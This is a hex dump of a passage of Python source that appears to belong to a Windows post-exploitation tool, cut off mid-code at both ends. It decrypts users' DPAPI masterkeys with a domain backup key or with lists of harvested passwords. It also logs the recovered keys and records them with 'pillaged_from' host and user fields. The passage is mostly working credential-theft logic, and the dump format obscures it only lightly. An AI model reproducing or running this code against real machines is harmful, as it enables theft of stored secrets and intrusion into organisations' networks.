+000171b0: 732e 454e 4443 7d20 6f66 204d 6173 7465  s.ENDC} of Maste
+000171c0: 726b 6579 207b 6775 6964 7d20 666f 7220  rkey {guid} for 
+000171d0: 7573 6572 207b 6263 6f6c 6f72 732e 4f4b  user {bcolors.OK
+000171e0: 424c 5545 7d20 7b75 7365 722e 7573 6572  BLUE} {user.user
+000171f0: 6e61 6d65 7d7b 6263 6f6c 6f72 732e 454e  name}{bcolors.EN
+00017200: 4443 7d20 205c 6e4b 6579 3a20 7b64 6563  DC}  \nKey: {dec
+00017210: 7279 7074 6564 5f6d 6173 7465 726b 6579  rypted_masterkey
+00017220: 7d22 290a 0909 0909 0909 7365 6c66 2e64  }").......self.d
+00017230: 622e 7570 6461 7465 5f6d 6173 7465 726b  b.update_masterk
+00017240: 6579 2866 696c 655f 7061 7468 3d75 7365  ey(file_path=use
+00017250: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
+00017260: 655b 6775 6964 5d5b 2770 6174 6827 5d2c  e[guid]['path'],
+00017270: 2067 7569 643d 6775 6964 2c0a 0909 0909   guid=guid,.....
+00017280: 0909 0909 0909 0909 2073 7461 7475 733d  ........ status=
+00017290: 7573 6572 2e6d 6173 7465 726b 6579 735f  user.masterkeys_
+000172a0: 6669 6c65 5b67 7569 645d 5b27 7374 6174  file[guid]['stat
+000172b0: 7573 275d 2c0a 0909 0909 0909 0909 0909  us'],...........
+000172c0: 0909 2064 6563 7279 7074 6564 5f77 6974  .. decrypted_wit
+000172d0: 683d 2244 4f4d 4149 4e2d 5056 4b22 2c0a  h="DOMAIN-PVK",.
+000172e0: 0909 0909 0909 0909 0909 0909 2064 6563  ............ dec
+000172f0: 7279 7074 6564 5f76 616c 7565 3d64 6563  rypted_value=dec
+00017300: 7279 7074 6564 5f6d 6173 7465 726b 6579  rypted_masterkey
+00017310: 2c0a 0909 0909 0909 0909 0909 0909 2070  ,............. p
+00017320: 696c 6c61 6765 645f 6672 6f6d 5f63 6f6d  illaged_from_com
+00017330: 7075 7465 725f 6970 3d73 656c 662e 6f70  puter_ip=self.op
+00017340: 7469 6f6e 732e 7461 7267 6574 5f69 702c  tions.target_ip,
+00017350: 0a09 0909 0909 0909 0909 0909 0920 7069  ............. pi
+00017360: 6c6c 6167 6564 5f66 726f 6d5f 7573 6572  llaged_from_user
+00017370: 6e61 6d65 3d75 7365 722e 7573 6572 6e61  name=user.userna
+00017380: 6d65 290a 0909 0909 0909 7265 7475 726e  me).......return
+00017390: 2075 7365 722e 6d61 7374 6572 6b65 7973   user.masterkeys
+000173a0: 5f66 696c 655b 6775 6964 5d0a 0909 0909  _file[guid].....
+000173b0: 0965 6c73 653a 0a09 0909 0909 0973 656c  .else:.......sel
+000173c0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+000173d0: 0a09 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
+000173e0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+000173f0: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
+00017400: 524e 494e 477d 446f 6d61 696e 2042 6163  RNING}Domain Bac
+00017410: 6b75 706b 6579 207b 7365 6c66 2e6f 7074  kupkey {self.opt
+00017420: 696f 6e73 2e70 766b 7d20 6361 6e27 7420  ions.pvk} can't 
+00017430: 6465 636f 6465 207b 6263 6f6c 6f72 732e  decode {bcolors.
+00017440: 4f4b 424c 5545 7d7b 7573 6572 2e75 7365  OKBLUE}{user.use
+00017450: 726e 616d 657d 7b62 636f 6c6f 7273 2e57  rname}{bcolors.W
+00017460: 4152 4e49 4e47 7d20 4d61 7374 6572 6b65  ARNING} Masterke
+00017470: 7920 7b67 7569 647d 202d 3e20 4368 6563  y {guid} -> Chec
+00017480: 6b69 6e67 2077 6974 6820 4c6f 6361 6c20  king with Local 
+00017490: 7573 6572 2077 6974 6820 6372 6564 7a7b  user with credz{
+000174a0: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
+000174b0: 0909 0909 0909 2320 6966 2075 7365 722e  ......# if user.
+000174c0: 7479 7065 5f76 616c 6964 6174 6564 203d  type_validated =
+000174d0: 3d20 4661 6c73 653a 0a09 0909 0909 0974  = False:.......t
+000174e0: 6573 7465 645f 7479 7065 2e61 7070 656e  ested_type.appen
+000174f0: 6428 2744 4f4d 4149 4e27 290a 0909 0909  d('DOMAIN').....
+00017500: 0909 7265 7475 726e 2073 656c 662e 6465  ..return self.de
+00017510: 6372 7970 745f 6d61 7374 6572 6b65 7928  crypt_masterkey(
+00017520: 7573 6572 2c20 6775 6964 2c20 274c 4f43  user, guid, 'LOC
+00017530: 414c 272c 2074 6573 7465 645f 7479 7065  AL', tested_type
+00017540: 3d74 6573 7465 645f 7479 7065 290a 0909  =tested_type)...
+00017550: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
+00017560: 6f6e 2061 7320 6578 3a0a 0909 0909 0973  on as ex:......s
+00017570: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00017580: 6728 0a09 0909 0909 0966 225b 7b73 656c  g(.......f"[{sel
+00017590: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+000175a0: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
+000175b0: 4152 4e49 4e47 7d45 7863 6570 7469 6f6e  ARNING}Exception
+000175c0: 2064 6563 7279 7074 696e 6720 7b62 636f   decrypting {bco
+000175d0: 6c6f 7273 2e4f 4b42 4c55 457d 7b75 7365  lors.OKBLUE}{use
+000175e0: 722e 7573 6572 6e61 6d65 7d7b 6263 6f6c  r.username}{bcol
+000175f0: 6f72 732e 454e 4443 7d20 6d61 7374 6572  ors.ENDC} master
+00017600: 6b65 7920 7b67 7569 647d 2077 6974 6820  key {guid} with 
+00017610: 446f 6d61 696e 2042 6163 6b75 706b 6579  Domain Backupkey
+00017620: 2028 6d6f 7374 206c 696b 656c 7920 7573   (most likely us
+00017630: 6572 2069 7320 6f6e 6c79 206c 6f63 616c  er is only local
+00017640: 2075 7365 7229 202d 3e20 5275 6e6e 696e   user) -> Runnin
+00017650: 6720 666f 7220 4c6f 6361 6c20 7573 6572  g for Local user
+00017660: 2077 6974 6820 6372 6564 7a7b 6263 6f6c   with credz{bcol
+00017670: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
+00017680: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00017690: 6275 6728 6622 6578 6365 7074 696f 6e20  bug(f"exception 
+000176a0: 7761 7320 3a20 7b65 787d 2229 0a09 0909  was : {ex}")....
+000176b0: 0909 2320 6966 2075 7365 722e 7479 7065  ..# if user.type
+000176c0: 5f76 616c 6964 6174 6564 203d 3d20 4661  _validated == Fa
+000176d0: 6c73 653a 0a09 0909 0909 7465 7374 6564  lse:......tested
+000176e0: 5f74 7970 652e 6170 7065 6e64 2827 444f  _type.append('DO
+000176f0: 4d41 494e 2729 0a09 0909 0909 7265 7475  MAIN')......retu
+00017700: 726e 2073 656c 662e 6465 6372 7970 745f  rn self.decrypt_
+00017710: 6d61 7374 6572 6b65 7928 7573 6572 2c20  masterkey(user, 
+00017720: 6775 6964 2c20 274c 4f43 414c 272c 2074  guid, 'LOCAL', t
+00017730: 6573 7465 645f 7479 7065 3d74 6573 7465  ested_type=teste
+00017740: 645f 7479 7065 290a 0909 0923 2074 7970  d_type)....# typ
+00017750: 653d 3d4c 4f43 414c 0a09 0909 2320 4f6e  e==LOCAL....# On
+00017760: 2061 2064 6573 2063 7265 647a 0a09 0909   a des credz....
+00017770: 6966 206c 656e 2873 656c 662e 6f70 7469  if len(self.opti
+00017780: 6f6e 732e 6372 6564 7a29 203e 2030 2061  ons.credz) > 0 a
+00017790: 6e64 2075 7365 722e 6d61 7374 6572 6b65  nd user.masterke
+000177a0: 7973 5f66 696c 655b 6775 6964 5d5b 0a09  ys_file[guid][..
+000177b0: 0909 0927 7374 6174 7573 275d 2021 3d20  ...'status'] != 
+000177c0: 2764 6563 7279 7074 6564 273a 2020 2320  'decrypted':  # 
+000177d0: 6c6f 6361 6c66 696c 6520 6e6f 7420 696e  localfile not in
+000177e0: 2075 7365 722e 6d61 7374 6572 6b65 7973   user.masterkeys
+000177f0: 3a0a 0909 0909 7365 6c66 2e6c 6f67 6769  :.....self.loggi
+00017800: 6e67 2e64 6562 7567 280a 0909 0909 0966  ng.debug(......f
+00017810: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
+00017820: 7461 7267 6574 5f69 707d 5d20 5b2e 2e2e  target_ip}] [...
+00017830: 5d20 5465 7374 696e 6720 6465 636f 6469  ] Testing decodi
+00017840: 6e67 207b 6263 6f6c 6f72 732e 4f4b 424c  ng {bcolors.OKBL
+00017850: 5545 7d7b 7573 6572 2e75 7365 726e 616d  UE}{user.usernam
+00017860: 657d 7b62 636f 6c6f 7273 2e45 4e44 437d  e}{bcolors.ENDC}
+00017870: 204d 6173 7465 726b 6579 207b 6775 6964   Masterkey {guid
+00017880: 7d20 7769 7468 2063 7265 647a 2229 0a09  } with credz")..
+00017890: 0909 0966 6f72 2075 7365 726e 616d 6520  ...for username 
+000178a0: 696e 2073 656c 662e 6f70 7469 6f6e 732e  in self.options.
+000178b0: 6372 6564 7a3a 0a09 0909 0909 6966 2075  credz:......if u
+000178c0: 7365 726e 616d 652e 6c6f 7765 7228 2920  sername.lower() 
+000178d0: 696e 2075 7365 722e 7573 6572 6e61 6d65  in user.username
+000178e0: 2e6c 6f77 6572 2829 3a20 2023 2070 6f75  .lower():  # pou
+000178f0: 7220 666f 6e63 7469 6f6e 6e65 7220 6175  r fonctionner au
+00017900: 7373 6920 6176 6563 206c 6520 2e64 6f6d  ssi avec le .dom
+00017910: 6169 6e20 6f75 206c 6573 2073 6573 7369  ain ou les sessi
+00017920: 6f6e 7320 6d75 6c74 6970 6c65 2063 6974  ons multiple cit
+00017930: 7269 7820 656e 2075 7365 722e 646f 6d61  rix en user.doma
+00017940: 696e 2e30 3031 203f 0a09 0909 0909 0923  in.001 ?.......#
+00017950: 2073 656c 662e 6c6f 6767 696e 672e 6465   self.logging.de
+00017960: 6275 6728 6622 5b7b 7365 6c66 2e6f 7074  bug(f"[{self.opt
+00017970: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00017980: 205b 2e2e 2e5d 2054 6573 7469 6e67 207b   [...] Testing {
+00017990: 6c65 6e28 7365 6c66 2e6f 7074 696f 6e73  len(self.options
+000179a0: 2e63 7265 647a 5b75 7365 726e 616d 655d  .credz[username]
+000179b0: 297d 2063 7265 647a 2066 6f72 2075 7365  )} credz for use
+000179c0: 7220 7b75 7365 722e 7573 6572 6e61 6d65  r {user.username
+000179d0: 7d22 290a 0909 0909 0909 2320 666f 7220  }").......# for 
+000179e0: 7465 7374 5f63 7265 6420 696e 2073 656c  test_cred in sel
+000179f0: 662e 6f70 7469 6f6e 732e 6372 6564 7a5b  f.options.credz[
+00017a00: 7573 6572 2e75 7365 726e 616d 655d 3a0a  user.username]:.
+00017a10: 0909 0909 0909 7472 793a 0a09 0909 0909  ......try:......
+00017a20: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00017a30: 6562 7567 280a 0909 0909 0909 0909 6622  ebug(.........f"
+00017a40: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+00017a50: 6172 6765 745f 6970 7d5d 5472 7969 6e67  arget_ip}]Trying
+00017a60: 2074 6f20 6465 6372 7970 7420 7b62 636f   to decrypt {bco
+00017a70: 6c6f 7273 2e4f 4b42 4c55 457d 7b75 7365  lors.OKBLUE}{use
+00017a80: 722e 7573 6572 6e61 6d65 7d7b 6263 6f6c  r.username}{bcol
+00017a90: 6f72 732e 454e 4443 7d20 4d61 7374 6572  ors.ENDC} Master
+00017aa0: 6b65 7920 7b67 7569 647d 2077 6974 6820  key {guid} with 
+00017ab0: 7573 6572 2053 4944 207b 7573 6572 2e73  user SID {user.s
+00017ac0: 6964 7d20 616e 6420 7b6c 656e 2873 656c  id} and {len(sel
+00017ad0: 662e 6f70 7469 6f6e 732e 6372 6564 7a5b  f.options.credz[
+00017ae0: 7573 6572 6e61 6d65 5d29 7d63 7265 6465  username])}crede
+00017af0: 6e74 6961 6c28 7329 2066 726f 6d20 6372  ntial(s) from cr
+00017b00: 6564 7a20 6669 6c65 2229 0a09 0909 0909  edz file")......
+00017b10: 0909 6d79 6f70 7469 6f6e 7320 3d20 636f  ..myoptions = co
+00017b20: 7079 2e64 6565 7063 6f70 7928 7365 6c66  py.deepcopy(self
+00017b30: 2e6f 7074 696f 6e73 290a 0909 0909 0909  .options).......
+00017b40: 096d 796f 7074 696f 6e73 2e66 696c 6520  .myoptions.file 
+00017b50: 3d20 6c6f 6361 6c66 696c 6520 2023 204d  = localfile  # M
+00017b60: 6173 7465 726b 6579 6669 6c65 2074 6f20  asterkeyfile to 
+00017b70: 7061 7273 650a 0909 0909 0909 0923 206d  parse........# m
+00017b80: 796f 7074 696f 6e73 2e70 6173 7377 6f72  yoptions.passwor
+00017b90: 6420 3d20 7365 6c66 2e6f 7074 696f 6e73  d = self.options
+00017ba0: 2e63 7265 647a 5b75 7365 726e 616d 655d  .credz[username]
+00017bb0: 0a09 0909 0909 0909 6d79 6f70 7469 6f6e  ........myoption
+00017bc0: 732e 7369 6420 3d20 7573 6572 2e73 6964  s.sid = user.sid
+00017bd0: 0a09 0909 0909 0909 6d79 6f70 7469 6f6e  ........myoption
+00017be0: 732e 7076 6b20 3d20 4e6f 6e65 0a09 0909  s.pvk = None....
+00017bf0: 0909 0909 6d79 6f70 7469 6f6e 732e 6b65  ....myoptions.ke
+00017c00: 7920 3d20 4e6f 6e65 0a09 0909 0909 0909  y = None........
+00017c10: 6d79 6470 6170 6920 3d20 4450 4150 4928  mydpapi = DPAPI(
+00017c20: 6d79 6f70 7469 6f6e 732c 2073 656c 662e  myoptions, self.
+00017c30: 6c6f 6767 696e 6729 0a09 0909 0909 0909  logging)........
+00017c40: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
+00017c50: 6b65 7920 3d20 6d79 6470 6170 692e 6465  key = mydpapi.de
+00017c60: 6372 7970 745f 6d61 7374 6572 6b65 7928  crypt_masterkey(
+00017c70: 7061 7373 776f 7264 733d 7365 6c66 2e6f  passwords=self.o
+00017c80: 7074 696f 6e73 2e63 7265 647a 5b75 7365  ptions.credz[use
+00017c90: 726e 616d 655d 290a 0909 0909 0909 0969  rname])........i
+00017ca0: 6620 6465 6372 7970 7465 645f 6d61 7374  f decrypted_mast
+00017cb0: 6572 6b65 7920 213d 202d 3120 616e 6420  erkey != -1 and 
+00017cc0: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
+00017cd0: 6b65 7920 213d 204e 6f6e 653a 0a09 0909  key != None:....
+00017ce0: 0909 0909 0923 2073 656c 662e 6c6f 6767  .....# self.logg
+00017cf0: 696e 672e 6465 6275 6728 6622 5b7b 7365  ing.debug(f"[{se
+00017d00: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00017d10: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+00017d20: 4f4b 4752 4545 4e7d 4465 6372 7970 7469  OKGREEN}Decrypti
+00017d30: 6f6e 2073 7563 6365 7373 6675 6c6c 207b  on successfull {
+00017d40: 6263 6f6c 6f72 732e 454e 4443 7d3a 207b  bcolors.ENDC}: {
+00017d50: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
+00017d60: 6b65 797d 2229 0a09 0909 0909 0909 0975  key}").........u
+00017d70: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
+00017d80: 696c 655b 6775 6964 5d5b 2773 7461 7475  ile[guid]['statu
+00017d90: 7327 5d20 3d20 2764 6563 7279 7074 6564  s'] = 'decrypted
+00017da0: 270a 0909 0909 0909 0909 7573 6572 2e6d  '.........user.m
+00017db0: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
+00017dc0: 7569 645d 5b27 6b65 7927 5d20 3d20 6465  uid]['key'] = de
+00017dd0: 6372 7970 7465 645f 6d61 7374 6572 6b65  crypted_masterke
+00017de0: 790a 0909 0909 0909 0909 2320 7573 6572  y.........# user
+00017df0: 2e6d 6173 7465 726b 6579 735b 6c6f 6361  .masterkeys[loca
+00017e00: 6c66 696c 655d 203d 2064 6563 7279 7074  lfile] = decrypt
+00017e10: 6564 5f6d 6173 7465 726b 6579 0a09 0909  ed_masterkey....
+00017e20: 0909 0909 0975 7365 722e 7479 7065 203d  .....user.type =
+00017e30: 2027 4c4f 4341 4c27 0a09 0909 0909 0909   'LOCAL'........
+00017e40: 0975 7365 722e 7479 7065 5f76 616c 6964  .user.type_valid
+00017e50: 6174 6564 203d 2054 7275 650a 0909 0909  ated = True.....
+00017e60: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+00017e70: 2e64 6562 7567 280a 0909 0909 0909 0909  .debug(.........
+00017e80: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+00017e90: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+00017ea0: 636f 6c6f 7273 2e4f 4b42 4c55 457d 4465  colors.OKBLUE}De
+00017eb0: 6372 7970 7469 6f6e 2073 7563 6365 7373  cryption success
+00017ec0: 6675 6c6c 207b 6263 6f6c 6f72 732e 454e  full {bcolors.EN
+00017ed0: 4443 7d20 6f66 204d 6173 7465 726b 6579  DC} of Masterkey
+00017ee0: 207b 6775 6964 7d20 666f 7220 5573 6572   {guid} for User
+00017ef0: 207b 6263 6f6c 6f72 732e 4f4b 4752 4545   {bcolors.OKGREE
+00017f00: 4e7d 207b 7573 6572 2e75 7365 726e 616d  N} {user.usernam
+00017f10: 657d 7b62 636f 6c6f 7273 2e45 4e44 437d  e}{bcolors.ENDC}
+00017f20: 2020 5c6e 4b65 793a 207b 6465 6372 7970    \nKey: {decryp
+00017f30: 7465 645f 6d61 7374 6572 6b65 797d 2229  ted_masterkey}")
+00017f40: 0a09 0909 0909 0909 0973 656c 662e 6462  .........self.db
+00017f50: 2e75 7064 6174 655f 6d61 7374 6572 6b65  .update_masterke
+00017f60: 7928 6669 6c65 5f70 6174 683d 7573 6572  y(file_path=user
+00017f70: 2e6d 6173 7465 726b 6579 735f 6669 6c65  .masterkeys_file
+00017f80: 5b67 7569 645d 5b27 7061 7468 275d 2c20  [guid]['path'], 
+00017f90: 6775 6964 3d67 7569 642c 0a09 0909 0909  guid=guid,......
+00017fa0: 0909 0909 0909 0909 0920 7374 6174 7573  ......... status
+00017fb0: 3d75 7365 722e 6d61 7374 6572 6b65 7973  =user.masterkeys
+00017fc0: 5f66 696c 655b 6775 6964 5d5b 2773 7461  _file[guid]['sta
+00017fd0: 7475 7327 5d2c 0a09 0909 0909 0909 0909  tus'],..........
+00017fe0: 0909 0909 0920 6465 6372 7970 7465 645f  ..... decrypted_
+00017ff0: 7769 7468 3d66 2250 6173 7377 6f72 643a  with=f"Password:
+00018000: 7b73 656c 662e 6f70 7469 6f6e 732e 6372  {self.options.cr
+00018010: 6564 7a5b 7573 6572 6e61 6d65 5d7d 222c  edz[username]}",
+00018020: 0a09 0909 0909 0909 0909 0909 0909 0920  ............... 
+00018030: 6465 6372 7970 7465 645f 7661 6c75 653d  decrypted_value=
+00018040: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
+00018050: 6b65 792c 0a09 0909 0909 0909 0909 0909  key,............
+00018060: 0909 0920 7069 6c6c 6167 6564 5f66 726f  ... pillaged_fro
+00018070: 6d5f 636f 6d70 7574 6572 5f69 703d 7365  m_computer_ip=se
+00018080: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00018090: 745f 6970 2c0a 0909 0909 0909 0909 0909  t_ip,...........
+000180a0: 0909 0909 2070 696c 6c61 6765 645f 6672  .... pillaged_fr
+000180b0: 6f6d 5f75 7365 726e 616d 653d 7573 6572  om_username=user
+000180c0: 2e75 7365 726e 616d 6529 0a09 0909 0909  .username)......
+000180d0: 0909 0972 6574 7572 6e20 7573 6572 2e6d  ...return user.m
+000180e0: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
+000180f0: 7569 645d 0a09 0909 0909 0909 656c 7365  uid]........else
+00018100: 3a0a 0909 0909 0909 0909 7365 6c66 2e6c  :.........self.l
+00018110: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
+00018120: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+00018130: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00018140: 707d 5d20 6572 726f 7220 6465 6372 7970  p}] error decryp
+00018150: 7469 6e67 207b 6263 6f6c 6f72 732e 4f4b  ting {bcolors.OK
+00018160: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
+00018170: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
+00018180: 437d 206d 6173 7465 726b 6579 2020 7b67  C} masterkey  {g
+00018190: 7569 647d 2077 6974 6820 7b6c 656e 2873  uid} with {len(s
+000181a0: 656c 662e 6f70 7469 6f6e 732e 6372 6564  elf.options.cred
+000181b0: 7a5b 7573 6572 6e61 6d65 5d29 7d20 7061  z[username])} pa
+000181c0: 7373 776f 7264 7320 6672 6f6d 2075 7365  sswords from use
+000181d0: 7220 7b75 7365 726e 616d 657d 2069 6e20  r {username} in 
+000181e0: 6372 6564 206c 6973 7422 290a 0909 0909  cred list").....
+000181f0: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
+00018200: 6f6e 2061 7320 6578 3a0a 0909 0909 0909  on as ex:.......
+00018210: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00018220: 6275 6728 0a09 0909 0909 0909 0966 225b  bug(.........f"[
+00018230: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00018240: 7267 6574 5f69 707d 5d20 4578 6365 7074  rget_ip}] Except
+00018250: 2064 6563 7279 7074 696e 6720 7b62 636f   decrypting {bco
+00018260: 6c6f 7273 2e4f 4b42 4c55 457d 7b75 7365  lors.OKBLUE}{use
+00018270: 722e 7573 6572 6e61 6d65 7d7b 6263 6f6c  r.username}{bcol
+00018280: 6f72 732e 454e 4443 7d20 6d61 7374 6572  ors.ENDC} master
+00018290: 6b65 7920 7769 7468 207b 6c65 6e28 7365  key with {len(se
+000182a0: 6c66 2e6f 7074 696f 6e73 2e63 7265 647a  lf.options.credz
+000182b0: 5b75 7365 726e 616d 655d 297d 2070 6173  [username])} pas
+000182c0: 7377 6f72 6473 2066 726f 6d20 7573 6572  swords from user
+000182d0: 207b 7573 6572 6e61 6d65 7d20 696e 2063   {username} in c
+000182e0: 7265 6420 6c69 7374 2229 0a09 0909 0909  red list")......
+000182f0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00018300: 6562 7567 2865 7829 0a09 0909 0965 6c73  ebug(ex).....els
+00018310: 653a 0a09 0909 0909 7365 6c66 2e6c 6f67  e:......self.log
+00018320: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
+00018330: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+00018340: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+00018350: 6263 6f6c 6f72 732e 4641 494c 7d6e 6f20  bcolors.FAIL}no 
+00018360: 6372 6564 656e 7469 616c 2069 6e20 6372  credential in cr
+00018370: 6564 7a20 6669 6c65 2066 6f72 2075 7365  edz file for use
+00018380: 7220 7b75 7365 722e 7573 6572 6e61 6d65  r {user.username
+00018390: 7d20 616e 6420 6d61 7374 6572 6b65 7920  } and masterkey 
+000183a0: 7b67 7569 647d 207b 6263 6f6c 6f72 732e  {guid} {bcolors.
+000183b0: 454e 4443 7d22 290a 0909 0974 6573 7465  ENDC}")....teste
+000183c0: 645f 7479 7065 2e61 7070 656e 6428 274c  d_type.append('L
+000183d0: 4f43 414c 2729 0a09 0909 6966 2075 7365  OCAL')....if use
+000183e0: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
+000183f0: 655b 6775 6964 5d5b 2773 7461 7475 7327  e[guid]['status'
+00018400: 5d20 3d3d 2027 656e 6372 7970 7465 6427  ] == 'encrypted'
+00018410: 3a0a 0909 0909 6966 2027 444f 4d41 494e  :.....if 'DOMAIN
+00018420: 2720 6e6f 7420 696e 2074 6573 7465 645f  ' not in tested_
+00018430: 7479 7065 3a0a 0909 0909 0972 6574 7572  type:......retur
+00018440: 6e20 7365 6c66 2e64 6563 7279 7074 5f6d  n self.decrypt_m
+00018450: 6173 7465 726b 6579 2875 7365 722c 2067  asterkey(user, g
+00018460: 7569 642c 2027 444f 4d41 494e 272c 2074  uid, 'DOMAIN', t
+00018470: 6573 7465 645f 7479 7065 3d74 6573 7465  ested_type=teste
+00018480: 645f 7479 7065 290a 0909 0909 656c 6966  d_type).....elif
+00018490: 2027 4d41 4348 494e 4527 206e 6f74 2069   'MACHINE' not i
+000184a0: 6e20 7465 7374 6564 5f74 7970 653a 0a09  n tested_type:..
+000184b0: 0909 0909 7265 7475 726e 2073 656c 662e  ....return self.
+000184c0: 6465 6372 7970 745f 6d61 7374 6572 6b65  decrypt_masterke
+000184d0: 7928 7573 6572 2c20 6775 6964 2c20 274d  y(user, guid, 'M
+000184e0: 4143 4849 4e45 272c 2074 6573 7465 645f  ACHINE', tested_
+000184f0: 7479 7065 3d74 6573 7465 645f 7479 7065  type=tested_type
+00018500: 290a 0909 0909 656c 6966 2027 4d41 4348  ).....elif 'MACH
+00018510: 494e 452d 5553 4552 2720 6e6f 7420 696e  INE-USER' not in
+00018520: 2074 6573 7465 645f 7479 7065 3a0a 0909   tested_type:...
+00018530: 0909 0972 6574 7572 6e20 7365 6c66 2e64  ...return self.d
+00018540: 6563 7279 7074 5f6d 6173 7465 726b 6579  ecrypt_masterkey
+00018550: 2875 7365 722c 2067 7569 642c 2027 4d41  (user, guid, 'MA
+00018560: 4348 494e 452d 5553 4552 272c 2074 6573  CHINE-USER', tes
+00018570: 7465 645f 7479 7065 3d74 6573 7465 645f  ted_type=tested_
+00018580: 7479 7065 290a 0a09 0909 2320 6f6e 2061  type).....# on a
+00018590: 2070 6173 2073 7520 6c65 2064 6563 6869   pas su le dechi
+000185a0: 6666 7265 722c 206d 6169 7320 6f6e 2063  ffrer, mais on c
+000185b0: 6f6e 7365 7665 206c 6120 6d61 7374 6572  onseve la master
+000185c0: 6b65 790a 0909 0927 2727 6966 206c 6f63  key....'''if loc
+000185d0: 616c 6669 6c65 206e 6f74 2069 6e20 7573  alfile not in us
+000185e0: 6572 2e6d 6173 7465 726b 6579 733a 0a09  er.masterkeys:..
+000185f0: 0909 0975 7365 722e 6d61 7374 6572 6b65  ...user.masterke
+00018600: 7973 5b6c 6f63 616c 6669 6c65 5d20 3d20  ys[localfile] = 
+00018610: 4e6f 6e65 2727 270a 0909 0969 6620 7573  None'''....if us
+00018620: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
+00018630: 6c65 5b67 7569 645d 5b27 7374 6174 7573  le[guid]['status
+00018640: 275d 203d 3d20 2765 6e63 7279 7074 6564  '] == 'encrypted
+00018650: 273a 0a09 0909 0975 7365 722e 6d61 7374  ':.....user.mast
+00018660: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
+00018670: 5d5b 2773 7461 7475 7327 5d20 3d20 2764  ]['status'] = 'd
+00018680: 6563 7279 7074 696f 6e5f 6661 696c 6564  ecryption_failed
+00018690: 270a 0909 0909 7365 6c66 2e64 622e 7570  '.....self.db.up
+000186a0: 6461 7465 5f6d 6173 7465 726b 6579 2866  date_masterkey(f
+000186b0: 696c 655f 7061 7468 3d75 7365 722e 6d61  ile_path=user.ma
+000186c0: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
+000186d0: 6964 5d5b 2770 6174 6827 5d2c 2067 7569  id]['path'], gui
+000186e0: 643d 6775 6964 2c0a 0909 0909 0909 0909  d=guid,.........
+000186f0: 0909 2073 7461 7475 733d 7573 6572 2e6d  .. status=user.m
+00018700: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
+00018710: 7569 645d 5b27 7374 6174 7573 275d 2c20  uid]['status'], 
+00018720: 6465 6372 7970 7465 645f 7769 7468 3d27  decrypted_with='
+00018730: 272c 0a09 0909 0909 0909 0909 0920 6465  ',........... de
+00018740: 6372 7970 7465 645f 7661 6c75 653d 2727  crypted_value=''
+00018750: 2c0a 0909 0909 0909 0909 0909 2070 696c  ,........... pil
+00018760: 6c61 6765 645f 6672 6f6d 5f63 6f6d 7075  laged_from_compu
+00018770: 7465 725f 6970 3d73 656c 662e 6f70 7469  ter_ip=self.opti
+00018780: 6f6e 732e 7461 7267 6574 5f69 702c 0a09  ons.target_ip,..
+00018790: 0909 0909 0909 0909 0920 7069 6c6c 6167  ......... pillag
+000187a0: 6564 5f66 726f 6d5f 7573 6572 6e61 6d65  ed_from_username
+000187b0: 3d75 7365 722e 7573 6572 6e61 6d65 290a  =user.username).
+000187c0: 0909 0909 7265 7475 726e 202d 310a 0909  ....return -1...
+000187d0: 0965 6c69 6620 7573 6572 2e6d 6173 7465  .elif user.maste
+000187e0: 726b 6579 735f 6669 6c65 5b67 7569 645d  rkeys_file[guid]
+000187f0: 5b27 7374 6174 7573 275d 203d 3d20 2764  ['status'] == 'd
